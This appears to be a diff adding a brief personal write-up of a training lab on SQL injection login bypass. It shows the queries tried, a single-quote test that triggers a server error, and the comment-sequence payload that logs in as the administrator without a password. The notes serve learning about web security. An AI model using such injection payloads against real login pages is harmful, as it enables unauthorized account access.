@@ -1,0 +1,26 @@
+Lab: SQL injection vulnerability allowing login bypass
+
+SQL injection - Login functionality
+Goal: SQL injection attack that logs in to the application as the administrator user.
+
+
+Analysis
+
+
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+target to bypass password
+
+SELECT * FROM users WHERE username = 'admin'--' AND password = 'admin'
+Invalid username or password.
+
+
+SELECT * FROM users WHERE username = ''' AND password = 'admin'
+Internal Server Error, that means vulnerability is there
+
+SELECT * FROM users WHERE username = 'admin'--' AND password = 'admin'
+only checks username skip the rest
+
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+password bypass 
+solved
